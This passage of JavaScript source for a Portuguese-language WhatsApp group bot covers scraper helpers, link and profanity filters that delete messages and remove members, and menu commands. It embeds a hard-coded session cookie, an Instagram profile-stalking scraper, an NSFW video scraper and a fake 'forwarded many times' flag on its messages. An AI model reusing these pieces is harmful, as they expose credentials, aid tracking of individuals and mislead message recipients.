            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function hentaivid() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 1153)
        axios.get('https://sfmcompile.club/page/'+page)
        .then((data) => {
            const $ = cheerio.load(data.data)
            const hasil = []
            $('#primary > div > div > ul > li > article').each(function (a, b) {
                hasil.push({
                    title: $(b).find('header > h2').text(),
                    link: $(b).find('header > h2 > a').attr('href'),
                    category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
                    share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
                    views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
                    type: $(b).find('source').attr('type') || 'image/jpeg',
                    video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
                    video_2: $(b).find('video > a').attr('href') || ''
                })
            })
            resolve(hasil)
        })
    })
}	

async function GetBuffer(url) {
	return new Promise(async (resolve, reject) => {
		let buffer;
		await jimp
			.read(url)
			.then((image) => {
				image.getBuffer(image._originalMime, function (err, res) {
					buffer = res;
				});
			})
			.catch(reject);
		if (!Buffer.isBuffer(buffer)) reject(false);
		resolve(buffer);
	});
}
function GetType(Data) {
	return new Promise((resolve, reject) => {
		let Result, Status;
		if (Buffer.isBuffer(Data)) {
			Result = new Buffer.from(Data).toString("base64");
			Status = 0;
		} else {
			Status = 1;
		}
		resolve({
			status: Status,
			result: Result,
		});
	});
}
async function Cartoon(url) {
	return new Promise(async (resolve, reject) => {
		let Data;
		try {
			let buffer = await GetBuffer(url);
			let Base64 = await GetType(buffer);
			await axios
				.request({
					url: "https://access1.imglarger.com/PhoAi/Upload",
					method: "POST",
					headers: {
						connection: "keep-alive",
						accept: "application/json, text/plain, */*",
						"content-type": "application/json",
					},
					data: JSON.stringify({
						type: 11,
						base64Image: Base64.result,
					}),
				})
				.then(async ({ data }) => {
					let code = data.data.code;
					let type = data.data.type;
					while (true) {
						let LopAxios = await axios.request({
							url: "https://access1.imglarger.com/PhoAi/CheckStatus",
							method: "POST",
							headers: {
								connection: "keep-alive",
								accept: "application/json, text/plain, */*",
								"content-type": "application/json",
							},
							data: JSON.stringify({
								code: code,
								isMember: 0,
								type: type,
							}),
						});
						let status = LopAxios.data.data.status;
						if (status == "sucesso") {
							Data = {
								message: "sucesso",
								download: {
									full: LopAxios.data.data.downloadUrls[0],
									head: LopAxios.data.data.downloadUrls[1],
								},
							};
							break;
						} else if (status == "noface") {
							Data = {
								message: "noface",
							};
							break;
						}
					}
				});
		} catch (_error) {
			Data = false;
		} finally {
			if (Data == false) {
				reject(false);
			}
			resolve(Data);
		}
	});
}
function randomId() {
	return Math.floor(100000 + Math.random() * 900000);
}

async function igstalk(Username) {
  return new Promise((resolve, reject) => {
    axios.get('https://dumpor.com/v/'+Username, {
      headers: {
        "cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
      }
    }).then(res => {
      const $ = cheerio.load(res.data)
      const result = {
        profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
        fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
        username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
        post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
        followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
        following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
        bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
      }
      resolve(result)
    })
  })
}

async function replyprem(teks) {
    m.reply(`Este recurso é para usuários premium, entre em contato com o proprietário para se tornar um usuário premium`)
}

        // Autosticker gp
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                await Lucy.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Adesivo automático detectado`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await Lucy.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }

// Anti Link
        if (Antilinkgc) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return GhostStickBotAdmin()
        let gclink = (`https://chat.whatsapp.com/`+await Lucy.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return Lucy.sendMessage(m.chat, {text: `\`\`\`「 Link de grupo detectado 」\`\`\`\n\nVocê não será kickado por um bot porque o que você envia é um link para este grupo`})
        if (isAdmins) return Lucy.sendMessage(m.chat, {text: `\`\`\`「 Link de grupo detectado 」\`\`\`\n\nAdmin enviou um link, admin está livre para postar qualquer link`})
        if (GhostTheCreator) return Lucy.sendMessage(m.chat, {text: `\`\`\`「 Link de grupo detectado 」\`\`\`\n\nUm Proprietário enviou um link, o proprietário está livre para postar qualquer link`})
        kice = m.sender
        await Lucy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Lucy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			Lucy.sendMessage(from, {text:`\`\`\`「 Link de grupo detectado 」\`\`\`\n\n@${kice.split("@")[0]} Foi expulso por enviar link de grupo neste grupo`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }

 // Antiwame by Ghost
  if (antiWame)
  if (budy.includes(`Wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin enviou um link wa.me, admin está livre para enviar qualquer link`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (GhostTheCreator) return m.reply(bvl)
kice = m.sender
        await Lucy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Lucy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Lucy.sendMessage(from, {text:`\`\`\`「 Link wa.me detectado 」\`\`\`\n\n@${kice.split("@")[0]} Foi expulso por enviar o link wa.me neste grupo`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antiWame)
  if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Link wa.me detectado 」\`\`\`\n\n O administrador enviou um link wa.me, o administrador é livre para enviar qualquer link`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (GhostTheCreator) return m.reply(bvl)
kice = m.sender
        await Lucy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Lucy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Lucy.sendMessage(from, {text:`\`\`\`「 Link wa.me detectado 」\`\`\`\n\n@${kice.split("@")[0]} Foi expulso por enviar o link wa.me neste grupo`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//anti trava txt by Ghost
  if (antiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return GhostStickBotAdmin()
          await Lucy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Lucy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			Lucy.sendMessage(from, {text:`\`\`\`「 Anti Trava Txt 」\`\`\`\n\n@${m.sender.split("@")[0]} Foi expulso por enviar trava txt neste grupo`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//anti palavrões por Ghost
if (antiToxic)
if (BadGhost.includes(messagesD)) {
if (m.text) {
bvl = `\`\`\`「 Palavra imprópria detectada 」\`\`\`\n\n Você está usando um palavrão, mas você é um administrador/proprietário, por isso não vou Expulsalo`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (GhostTheCreator) return m.reply(bvl)
        await Lucy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			await Lucy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Lucy.sendMessage(from, {text:`\`\`\`「 Palavra imprópria detectada 」\`\`\`\n\n@${m.sender.split("@")[0]} foi expulso por usar palavrões neste grupo`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})}
}
//antilink youtube video by Ghost
if (AntiLinkYoutubeVid)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link de vídeo do Youtube detectado 」\`\`\`\n\nO Admin enviou um link de vídeo do youtube, o administrador é livre para enviar qualquer link`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (GhostTheCreator) return m.reply(bvl)
        await Lucy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Lucy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Lucy.sendMessage(from, {text:`\`\`\`「 Link de vídeo do YouTube detectado 」\`\`\`\n\n@${m.sender.split("@")[0]} Foi expulso por enviar link de vídeo do youtube neste grupo`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by Ghost
if (AntiLinkYoutubeChannel)
   if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link do Canal do Youtube Detectado 」\`\`\`\n\nO Admin enviou um link do canal do youtube, admin está livre para enviar qualquer link`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (GhostTheCreator) return m.reply(bvl)
        await Lucy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Lucy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Lucy.sendMessage(from, {text:`\`\`\`「 Link do canal do YouTube detectado 」\`\`\`\n\n@${m.sender.split("@")[0]} Foi expulso por enviar o link do canal do youtube neste grupo`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
//antilink instagram by Ghost
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link do Instagram detectado 」\`\`\`\n\nO administrador enviou um link do Instagram, o administrador é livre para enviar qualquer link`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (GhostTheCreator) return m.reply(bvl)
        await Lucy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Lucy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Lucy.sendMessage(from, {text:`\`\`\`「 Link do Instagram detectado 」\`\`\`\n\n@${m.sender.split("@")[0]} Foi expulso por enviar link do instagram neste grupo`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by Ghost
if (AntiLinkFacebook)
   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link do Facebook detectado 」\`\`\`\n\nO administrador enviou um link do Facebook, o administrador é livre para enviar qualquer link`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (GhostTheCreator) return m.reply(bvl)
        await Lucy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Lucy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Lucy.sendMessage(from, {text:`\`\`\`「 Link do Facebook detectado 」\`\`\`\n\n@${m.sender.split("@")[0]} Foi expulso por enviar link do facebook neste grupo`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by Ghost
if (AntiLinkTelegram)
   if (budy.includes("https://t.me/")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Link do telegrama detectado 」\`\`\`\n\nO administrador enviou um link de telegrama, o administrador é livre para enviar qualquer link`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (GhostTheCreator) return m.reply(bvl)
        await Lucy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Lucy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Lucy.sendMessage(from, {text:`\`\`\`「 Link do telegrama detectado 」\`\`\`\n\n@${m.sender.split("@")[0]} Foi expulso por enviar link de telegrama neste grupo`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink tiktok by Ghost
if (AntiLinkTiktok)
   if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link do Tiktok detectado 」\`\`\`\n\nO administrador enviou um link do tiktok, o administrador está livre para enviar qualquer link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (GhostTheCreator) return m.reply(bvl)
        await Lucy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Lucy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Lucy.sendMessage(from, {text:`\`\`\`「 Link do Tiktok detectado 」\`\`\`\n\n@${m.sender.split("@")[0]} Foi expulso por enviar link tiktok neste grupo`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by Ghost
if (AntiLinkTwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link do Twitter detectado 」\`\`\`\n\nO administrador enviou um link do Twitter, o administrador é livre para enviar qualquer link`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (GhostTheCreator) return m.reply(bvl)
        await Lucy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Lucy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Lucy.sendMessage(from, {text:`\`\`\`「 Link do Tiktok detectado 」\`\`\`\n\n@${m.sender.split("@")[0]} Foi expulso por enviar link do twitter neste grupo`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink all by Ghost
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detectado 」\`\`\`\n\nO administrador enviou um link, o administrador é livre para enviar qualquer link`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (GhostTheCreator) return m.reply(bvl)
        await Lucy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Lucy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Lucy.sendMessage(from, {text:`\`\`\`「 Link Detectado 」\`\`\`\n\n@${m.sender.split("@")[0]} Foi expulso por enviar link neste grupo`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

//cardápio
const timestamp = speed()
const latensi = speed() - timestamp
const mark = "0@s.whatsapp.net"

//randomizador de imagem de menu
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]

//emote
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
emoji.get(satu)
.then(emoji => {
Lucy.sendMessage(from, { caption: mess.success, image: {url: emoji.images[dua].url} }, {quoted:m})
})
} catch (e) {
m.reply("Erro de emoji, digite outro emoji\nNOTA: Basta digitar 1 emoji")
}
}

// Resposta Cmd com mídia
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: Lucy.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, Lucy.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
Lucy.ev.emit('messages.upsert', msg)
}

switch (command) {

	case 'publico': {
                if (!GhostTheCreator) return GhostStickOwner()
                Lucy.public = true
                replygcGhost('*Sucesso na mudança para uso público*')
            }
            break
            case 'self': {
                if (!GhostTheCreator) return GhostStickOwner()
                Lucy.public = false
                replygcGhost('*Sucesso na mudança para uso próprio*')
            }
            break
case 'rentbot': {
if (m.isGroup) return GhostStickPrivate()

rentfromGhost(Lucy, m, from)
}
break
case 'rentbotlist': 
try {
let user = [... new Set([...global.conns.filter(Lucy => Lucy.user).map(Lucy => Lucy.user)])]
te = "*Lista de Rentbots*\n\n"
for (let i of user){
y = await Lucy.decodeJid(i.id)
te += " × Do utilizador : @" + y.split("@")[0] + "\n"
te += " × Nome : " + i.name + "\n\n"
}
Lucy.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
replygcGhost(`Ainda não há usuários que alugaram o bot`)
}
break
case 'shutdown':
if (!GhostTheCreator) return GhostStickOwner()
replygcGhost(`tchau...`)
await sleep(3000)
process.exit()
break
case 'owner': {
const repf = await Lucy.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contato`, 
contacts: list }, mentions: [sender] }, { quoted: m })
Lucy.sendMessage(from, { text : `Oi @${sender.split("@")[0]}, Aqui está meu lindo dono`, mentions: [sender]}, { quoted: repf })
}
break
case 'menu5': {

            let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let timestampe = speed()
            let latensie = speed() - timestampe
            let lucy2 = `┌─❖
│ Ola 👋 
└┬❖  ${pushname} 
┌┤✑  ${Ghostytimewisher} 
│└──────────┈ ⳹
│
└─ 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧        
│𝗩𝗲𝗹𝗼𝗰𝗶𝗱𝗮𝗱𝗲 : ${latensie.toFixed(4)}
│𝗘𝘅𝗲𝗰𝘂𝘁𝗮𝗻𝗱𝗼 : ${runtime(process.uptime())}
│𝗕𝗼𝘁 : ${global.botname}
│𝗗𝗼𝗻𝗼: ${ownernumber}
│𝗣𝗿𝗲𝗳𝗶𝘅 : ! 
│𝗠𝗼𝗱𝗼 : ${Lucy.public ? 'Public' : `Self`}
│𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : ${os.platform()}
│
└─ 𝗜𝗡𝗙𝗢 𝗨𝗦𝗨𝗔𝗥𝗜𝗢 
│𝗡𝘂𝗺𝗲𝗿𝗼 : @${me.split('@')[0]}
│𝗣𝗿𝗲𝗺𝗶𝘂𝗺 : ${isPrem ? '✅' : `❌`}
│
└─ 𝗜𝗡𝗙𝗢 𝗛𝗢𝗥𝗔/𝗗𝗔𝗧𝗔
│𝗛𝗼𝗿𝗮 : ${xtime}
│𝗗𝗮𝘁𝗮 : ${xdate}
└───────────┈ ⳹`
                Lucy.sendPoll(m.chat, lucy2, ['menudono','outrosmenu','downloadmenu','menugrupo','menudiversao','menuestalquear','menudono','outrosmenu','downloadmenu','menugrupo','menudiversao','continuarmenu'])
            }
            break
            case 'continuarmenu': {
            let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let timestampe = speed()
            let latensie = speed() - timestampe
            let lucy22 = `┌─❖
│ Ola 👋 
└┬❖  ${pushname} 
┌┤✑  ${Ghostytimewisher} 
││𝗣𝗿𝗲𝗺𝗶𝘂𝗺 : ${isPrem ? '✅' : `❌`}
│└──────────┈ ⳹
│
└─ 𝗜𝗡𝗙𝗢 𝗛𝗢𝗥𝗔/𝗗𝗔𝗧𝗔
│𝗛𝗼𝗿𝗮 : ${xtime}
│𝗗𝗮𝘁𝗮 : ${xdate}
└───────────┈ ⳹`
                Lucy.sendPoll(m.chat, lucy22, ['menuestalquear','menufotoaleatoria','menuvideoaleatorio','menudetexto','menufotox','menunsfw','menufoto360','databasemenu','animemenu','stickermenu','iamenu'])
            }
            break
            
            case 'ping':{
            
            let timestampe = speed()
            let latensie = speed() - timestampe
            let lucy2 = `𝗩𝗲𝗹𝗼𝗰𝗶𝗱𝗮𝗱𝗲 : ${latensie.toFixed(4)}`
           Lucy.sendPoll(m.chat, lucy2, ['dono','menu2'])
            }
            break
case 'alive': case 'panel': case 'list': case 'menu': case 'help': case '?': {
	        let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let timestampe = speed()
            let latensie = speed() - timestampe
            Ghostezy = `┌─❖
│ Ola 👋 
└┬❖  ${pushname} 
┌┤✑  ${Ghostytimewisher} 
│└────────────┈ ⳹
│
└─ 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧        
│𝗩𝗲𝗹𝗼𝗰𝗶𝗱𝗮𝗱𝗲 : ${latensie.toFixed(4)}
│𝗘𝘅𝗲𝗰𝘂𝘁𝗮𝗻𝗱𝗼 : ${runtime(process.uptime())}
│𝗕𝗼𝘁 : ${global.botname}
│𝗗𝗼𝗻𝗼: ${ownernumber}
│𝗣𝗿𝗲𝗳𝗶𝘅 : ! 
│𝗠𝗼𝗱𝗼 : ${Lucy.public ? 'Public' : `Self`}
│𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : ${os.platform()}
│
└─ 𝗜𝗡𝗙𝗢 𝗨𝗦𝗨𝗔𝗥𝗜𝗢 
│𝗡𝗼𝗺𝗲 : ${pushname}
│𝗡𝘂𝗺𝗲𝗿𝗼 : @${me.split('@')[0]}
│𝗣𝗿𝗲𝗺𝗶𝘂𝗺 : ${isPrem ? '✅' : `❌`}
│
└─ 𝗜𝗡𝗙𝗢 𝗛𝗢𝗥𝗔/𝗗𝗔𝗧𝗔
│𝗛𝗼𝗿𝗮 : ${xtime}
│𝗗𝗮𝘁𝗮 : ${xdate}
└┬────────────┈ ⳹
   │✑  𝗔𝗧𝗔𝗟𝗛𝗢 𝗗𝗘 𝗠𝗘𝗡𝗨
┌└────────────┈ ⳹
│
│✑ ${prefix}menudono
│✑ ${prefix}outrosmenu
│✑ ${prefix}downloadmenu
│✑ ${prefix}menugrupo
│✑ ${prefix}menudiversao
│✑ ${prefix}menuestalquear
│✑ ${prefix}menufotoaleatoria
│✑ ${prefix}menuvideoaleatorio
│✑ ${prefix}menudetexto
│✑ ${prefix}menufotox
│✑ ${prefix}menunsfw
│✑ ${prefix}menufoto360
│✑ ${prefix}databasemenu
│✑ ${prefix}animemenu
│✑ ${prefix}stickermenu
│✑ ${prefix}iamenu
│
└─────────────────┈ ⳹`
            let ments = [ownernya, me, mark]        
           Lucy.sendMessage(from, { 
text: Ghostezy,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./GhostMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
}, { quoted: m })
           }
           break
case 'menudono': {
var unicorn = await getBuffer(picak+'Menu Dono')
sendLucyMessage(from, { 
text: `Ola @${sender.split("@")[0]}\n\n${ownermenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./GhostMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'outrosmenu': {
	var unicorn = await getBuffer(picak+'Outros Menu')
sendLucyMessage(from, { 
text: `Ola @${sender.split("@")[0]}\n\n${othermenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./GhostMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'downloadmenu': {
var unicorn = await getBuffer(picak+'Menu de Download')
sendLucyMessage(from, { 
text: `Ola @${sender.split("@")[0]}\n\n${downloadmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./GhostMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'menugrupo': {
var unicorn = await getBuffer(picak+'Menu Grupo')
sendLucyMessage(from, { 
text: `Ola @${sender.split("@")[0]}\n\n${groupmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./GhostMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'menudiversao': {
var unicorn = await getBuffer(picak+'Menu de diversão')
sendLucyMessage(from, { 
text: `Ola @${sender.split("@")[0]}\n\n${funmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./GhostMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'menuestalquear': {
var unicorn = await getBuffer(picak+'Menu de Estaquear')
sendLucyMessage(from, { 
text: `Ola @${sender.split("@")[0]}\n\n${stalkermenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./GhostMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'menufotoaleatoria': {
var unicorn = await getBuffer(picak+'Menu de Foto Aleatória')
sendLucyMessage(from, { 
text: `Ola @${sender.split("@")[0]}\n\n${randphotomenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./GhostMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'menuvideoaleatorio': {
var unicorn = await getBuffer(picak+'Menu de vídeo aleatório')
sendLucyMessage(from, { 
text: `Ola @${sender.split("@")[0]}\n\n${randvideomenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./GhostMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'menudetexto': {
var unicorn = await getBuffer(picak+'Menu de Texto')
sendLucyMessage(from, { 
text: `Ola @${sender.split("@")[0]}\n\n${textpromenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./GhostMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'menufotox': {
var unicorn = await getBuffer(picak+'Menu fotox')
sendLucyMessage(from, { 
text: `Ola @${sender.split("@")[0]}\n\n${photooxymenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
